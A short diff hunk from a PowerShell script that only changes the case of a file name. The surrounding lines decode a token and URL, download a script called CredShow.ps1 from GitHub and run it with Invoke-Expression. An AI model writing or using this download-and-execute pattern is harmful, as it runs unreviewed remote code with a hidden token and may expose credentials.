@@ -43,5 +43,5 @@ while (!($decT)) {
 $headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
 $headers.Add("Authorization", "token $($decT)")
 $headers.Add("Accept", "application/vnd.github.v3.raw")
-$Script = Invoke-RestMethod "$($decURL)CredShow.ps1" -Headers $headers
+$Script = Invoke-RestMethod "$($decURL)credShow.ps1" -Headers $headers
 Invoke-Expression $Script
